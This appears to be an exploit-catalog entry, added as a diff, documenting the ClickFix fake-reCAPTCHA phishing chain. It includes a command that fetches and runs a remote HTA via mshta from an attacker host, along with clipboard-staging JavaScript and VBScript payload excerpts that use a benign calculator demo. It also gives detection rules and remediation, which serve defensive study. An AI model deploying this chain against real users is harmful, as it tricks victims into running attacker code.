@@ -1,0 +1,190 @@
+# ClickFix Fake reCAPTCHA to mshta/HTA Execution Chain
+
+---
+
+## Metadata
+
+| Field | Value |
+|---|---|
+| **Date Added** | 2026-07-27 |
+| **Last Updated** | 2026-05 |
+| **Author / Researcher** | John Hammond |
+| **CVE / Advisory** | N/A (social-engineering technique, not a software vulnerability) |
+| **Category** | social-engineering |
+| **Severity** | High |
+| **CVSS Score** | N/A |
+| **Status** | Weaponized (educational/benign demo payload) |
+| **Tags** | clickfix, fake-captcha, clipboard-injection, mshta, hta, social-engineering, phishing, run-dialog, recaptcha-impersonation |
+| **Related** | N/A |
+
+---
+
+## Affected Target
+
+| Field | Value |
+|---|---|
+| **Software / System** | Human victim / Windows Run dialog (Win+R) or PowerShell/cmd, via `mshta.exe` |
+| **Versions Affected** | Not version-specific — targets any Windows user who can be socially engineered into pasting and executing a command |
+| **Language / Platform** | HTML/CSS/JavaScript (fake reCAPTCHA page), HTA + VBScript (payload stage), launched via `mshta.exe` |
+| **Authentication Required** | No |
+| **Network Access Required** | Yes (victim must load the phishing page from a web server, then the HTA is fetched from that same origin) |
+
+---
+
+## Summary
+
+This is a reference implementation of **ClickFix**, a widely used real-world social-engineering technique (reported by Unit42, Huntress, and Orange CyberDefense as used by numerous threat actors since roughly 2024, including in LummaStealer and Emmenhtal malware campaigns) in which a fake "I am not a robot" reCAPTCHA/verification page tricks the victim into copying an attacker-controlled command to their clipboard and then manually pasting and running it themselves via the Windows Run dialog (Win+R) or a terminal. There is no software vulnerability here and no CVE — the "exploit" is the victim's own trust and habitual behavior around CAPTCHAs, not a code flaw. This repository (`JohnHammond/recaptcha-phish`, 653 stars, 140 forks, by well-known security researcher John Hammond) implements the full chain end to end using only a benign `calc.exe` demo payload for educational/awareness purposes.
+
+---
+
+## Vulnerability Details
+
+### Root Cause
+
+There is no memory-safety, injection, or logic flaw being exploited. The "root cause" is a well-documented human-factors weakness: users have been conditioned to click through CAPTCHA/verification prompts and are generally unaware that a legitimate website cannot instruct them to open the Run dialog and paste a command. ClickFix abuses browser clipboard-write APIs (`document.execCommand("copy")`) and simple UI mimicry to smuggle a shell command onto the clipboard, then relies entirely on the victim to manually execute it outside the browser sandbox — sidestepping browser security controls (download warnings, mark-of-the-web, SmartScreen) entirely because no file is ever downloaded.
+
+### Attack Vector
+
+1. Victim lands on `index.html`, a page styled to visually mimic Google's real reCAPTCHA widget (same CSS layout, the actual `reCAPTCHA-logo@2x.png` from Google's CDN, and a fake "I am not a robot" checkbox).
+2. Victim clicks the checkbox; `runClickedCheckboxEffects()` hides the checkbox, shows a fake loading spinner, then calls `showVerifyWindow()`.
+3. `showVerifyWindow()` builds a command string: `mshta http://<origin>/recaptcha-verify` and calls `stageClipboard()`, which appends a decoy comment (` # ✅ "I am not a robot - reCAPTCHA Verification ID: <random>"`) so that if the victim inspects what they pasted, it still looks like an innocuous verification string.
+4. `setClipboardCopyData()` writes that full string to the clipboard via a hidden `<textarea>` + `document.execCommand("copy")`.
+5. An on-screen "verification window" instructs the victim to open the Run dialog (Win+R) and paste (Ctrl+V), framing this as required to "prove you are human."
+6. If the victim pastes and hits Enter, Windows runs `mshta http://<origin>/recaptcha-verify`, which downloads and executes `recaptcha-verify` — an HTA file containing embedded VBScript.
+7. The HTA's `Window_onLoad` VBScript handler uses `CreateObject("WScript.Shell")` to run the benign demo payload (`calc.exe`), then calls `ClearClipboard` (via an `htmlfile` COM object) to erase the staged command from the clipboard so the victim cannot easily inspect what they ran, then displays a fake "Failed to connect with the reCAPTCHA server" error to bait the victim into retrying (and thus reduce suspicion if the first attempt "did nothing" visible).
+
+### Impact
+
+Arbitrary command execution on the victim's Windows host, entirely outside the browser's security boundary, without any file download, macro, or exploit — because the victim manually types Win+R, pastes, and presses Enter themselves. In real-world abuse (per public threat-intel reporting), the payload staged this way is typically an infostealer or loader (e.g. LummaStealer, Emmenhtal-family loaders) rather than `calc.exe`. This repository's demo payload is intentionally harmless.
+
+---
+
+## Environment / Lab Setup
+
+```
+OS:          Windows 10/11 test VM (to observe the Run-dialog/mshta/HTA execution chain), isolated and disposable
+Web host:    Any static file server able to serve index.html and recaptcha-verify from the same origin
+                e.g. python3 -m http.server 8000  (served from this folder)
+Browser:     Any modern browser with clipboard-write support (Chrome/Edge/Firefox)
+```
+
+### Setup Steps
+
+```bash
+# From this folder, serve the two files over HTTP so mshta can fetch recaptcha-verify by URL
+python3 -m http.server 8000
+
+# On the Windows test VM, browse to:
+#   http://<attacker-host>:8000/index.html
+```
+
+---
+
+## Proof of Concept
+
+### Step-by-Step Reproduction
+
+1. **Serve the page** — Host `index.html` and `recaptcha-verify` from the same web origin (see Setup Steps above).
+   ```bash
+   python3 -m http.server 8000
+   ```
+
+2. **Visit and click the fake checkbox** — On the Windows test VM, open `http://<attacker-host>:8000/index.html` and click the "I am not a robot" checkbox. This silently stages the payload command on the clipboard.
+
+3. **Follow the fake verification prompt** — The page displays instructions telling the victim to press Win+R and paste. Doing so runs:
+   ```
+   mshta http://<attacker-host>:8000/recaptcha-verify # ✅ "I am not a robot - reCAPTCHA Verification ID: <random 4-digit id>"
+   ```
+   `mshta.exe` treats the text after the URL as an argument (ignored), fetches and renders `recaptcha-verify` as an HTA, and its embedded VBScript runs.
+
+### Exploit Code
+
+> See `index.html` (fake reCAPTCHA UI + clipboard staging) and `recaptcha-verify` (HTA/VBScript payload stage) in this folder — both are unmodified, byte-identical copies of the upstream files.
+
+```javascript
+// index.html — clipboard staging (excerpt, real code from this repo)
+function setClipboardCopyData(textToCopy){
+    const tempTextArea = document.createElement("textarea");
+    tempTextArea.value = textToCopy;
+    document.body.append(tempTextArea);
+    tempTextArea.select();
+    document.execCommand("copy");
+    document.body.removeChild(tempTextArea);
+}
+
+function showVerifyWindow() {
+    // ...
+    const htaPath = window.location.origin + "/recaptcha-verify";
+    const commandToRun = "mshta " + htaPath
+    stageClipboard(commandToRun, verification_id)
+}
+```
+
+```vbscript
+' recaptcha-verify (HTA) — payload stage (excerpt, real code from this repo)
+Sub Window_onLoad
+    Set objShell = CreateObject("WScript.Shell")
+    objShell.Run "calc.exe", 0, False   ' benign demo payload
+
+    ClearClipboard                       ' erase staged command from clipboard
+
+    objShell.Run "timeout /T 2 /nobreak", 0, True
+    Call HideConnectingShowError         ' fake "failed to connect" to bait re-attempts
+    objShell.Run "timeout /T 1 /nobreak", 0, True
+End Sub
+```
+
+### Expected Output
+
+```
+calc.exe (Windows Calculator) opens on the victim VM after pasting the command into the Run dialog.
+The reCAPTCHA page then shows: "Failed to connect with the reCAPTCHA server. Try the verification steps again."
+The clipboard is cleared, so re-inspecting it no longer reveals the executed command.
+```
+
+---
+
+## Detection & Indicators of Compromise
+
+```
+# mshta.exe launched with a command-line argument that is an HTTP(S) URL, especially
+# immediately following explorer.exe or a browser process, with no corresponding file download
+# in browser history for that URL.
+mshta.exe http://*/recaptcha-verify*
+```
+
+**Signs of compromise:**
+- `mshta.exe` spawned as a child of `explorer.exe` (via the Run dialog) rather than a browser, shortly after visiting a "verification"/CAPTCHA page
+- Clipboard content briefly containing a shell command (`mshta`, `powershell`, `cmd /c`, etc.) followed by a decoy comment referencing "I am not a robot" / "verification ID"
+- Web pages that visually mimic Google reCAPTCHA/hCaptcha/Cloudflare Turnstile but instruct the user to press Win+R or open a terminal
+- `WScript.Shell` object creation from an HTA loaded via `mshta` with no corresponding legitimate business use
+
+**SIEM / IDS Rule (example):**
+```
+alert process any any -> any any (msg:"Possible ClickFix mshta HTA execution from Run dialog"; process_name:"mshta.exe"; parent_process_name:"explorer.exe"; command_line:contains "http"; sid:9000101;)
+```
+
+---
+
+## Remediation
+
+| Action | Detail |
+|---|---|
+| **Patch** | Not applicable — this is a human-factors technique, not a software defect; there is no code patch that eliminates it |
+| **Workaround** | Restrict or disable `mshta.exe` execution via AppLocker/WDAC or Attack Surface Reduction rules where it is not a business requirement; block outbound connections from `mshta.exe` at the host firewall |
+| **Config Hardening** | User awareness training specifically covering ClickFix (never paste unknown commands into Run/PowerShell "to verify" anything); enable clipboard-monitoring EDR rules that flag command-like clipboard writes from browser tabs; disable or gate the Windows Run dialog via group policy in high-risk environments |
+
+---
+
+## References
+
+- [Source repository — JohnHammond/recaptcha-phish](https://github.com/JohnHammond/recaptcha-phish)
+- [Unit 42 — Behind the Deceptive Simplicity of Click Fix](https://unit42.paloaltonetworks.com/)
+- [Huntress — ClickFix reporting and detections](https://www.huntress.com/)
+- [Orange Cyberdefense — ClickFix threat actor tracking](https://www.orangecyberdefense.com/)
+
+---
+
+## Notes
+
+Verified before ingestion: real file contents were read directly from the cloned upstream repository (not summarized secondhand) — `index.html` implements the fake reCAPTCHA checkbox UI (mirroring Google's real reCAPTCHA CSS and logo asset) plus clipboard staging via `setClipboardCopyData()`/`document.execCommand("copy")`, and `recaptcha-verify` is a real HTA/VBScript file (`HTA:APPLICATION` header + `Window_onLoad` VBScript) that `mshta.exe` loads and executes. The demo payload was confirmed benign: it only runs `calc.exe` via `WScript.Shell`, then clears the clipboard and displays a fake "failed to connect" error — there is no dropper, no obfuscation, no network exfiltration, and no hidden second-stage payload anywhere in the repo. The author, John Hammond, was confirmed as a credible, well-known security researcher and educator (large public following, long-standing account) rather than an anonymous or suspicious contributor. This entry is filed under `social-engineering` with **no CVE** by design: ClickFix is not a vulnerability in any product, it is a technique that exploits human trust and habitual behavior around CAPTCHA/verification prompts, and its real-world use by threat actors (e.g. to deliver LummaStealer and Emmenhtal-family malware) is documented by Unit42, Huntress, and Orange Cyberdefense, not by any vendor advisory. `index.html` and `recaptcha-verify` in this folder are unmodified, byte-identical copies of the upstream files (verified via `diff`); `upstream-README.md` preserves the original repository README for reference.
